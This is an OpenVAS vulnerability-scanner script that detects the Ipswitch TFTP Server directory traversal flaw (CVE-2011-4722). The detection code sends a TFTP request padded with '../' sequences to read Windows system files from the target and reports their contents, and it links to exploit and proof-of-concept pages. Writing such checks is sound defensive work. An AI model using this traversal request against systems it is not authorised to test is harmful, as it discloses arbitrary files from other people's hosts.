###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ipswitch_tftp_server_dir_trav_vuln.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Ipswitch TFTP Server Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802405");
  script_version("$Revision: 13543 $");
  script_cve_id("CVE-2011-4722");
  script_bugtraq_id(50890);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-12-06 11:57:11 +0530 (Tue, 06 Dec 2011)");
  script_name("Ipswitch TFTP Server Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://secpod.org/blog/?p=424");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18189/");
  script_xref(name:"URL", value:"http://secpod.org/advisories/SecPod_Ipswitch_TFTP_Server_Dir_Trav.txt");
  script_xref(name:"URL", value:"http://secpod.org/exploits/SecPod_Ipswitch_TFTP_Server_Dir_Trav_POC.py");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Remote file access");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "tftpd_backdoor.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_require_keys("tftp/detected", "Host/runs_windows");
  script_exclude_keys("tftp/backdoor", "keys/TARGET_IS_IPV6");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary
  files on the affected application.");

  script_tag(name:"affected", value:"Ipswitch TFTP Server Version 1.0.0.24 and prior.");

  script_tag(name:"insight", value:"The flaw is due to an error while handling certain requests
  containing 'dot dot' sequences (..), which can be exploited to download
  arbitrary files from the host system.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running Ipswitch TFTP Server and is prone to directory
  traversal vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("tftp.inc");
include("network_func.inc");

port = get_kb_item("Services/udp/tftp");
if(!port)
  port = 69;

if(!get_udp_port_state(port))
  exit(0);

if(get_kb_item("tftp/" + port + "/backdoor"))
  exit(0);

files = traversal_files("windows");

foreach file(keys(files)) {

  res = tftp_get(port:port, path:crap(data:"../", length:6*9) + files[file]);
  if(egrep(pattern:file, string:res, icase:TRUE)) {
    report = string("The " + files[file] + " file contains:\n", res);
    security_message(port:port, data:report, proto:"udp");
    exit(0);
  }
}

exit(99);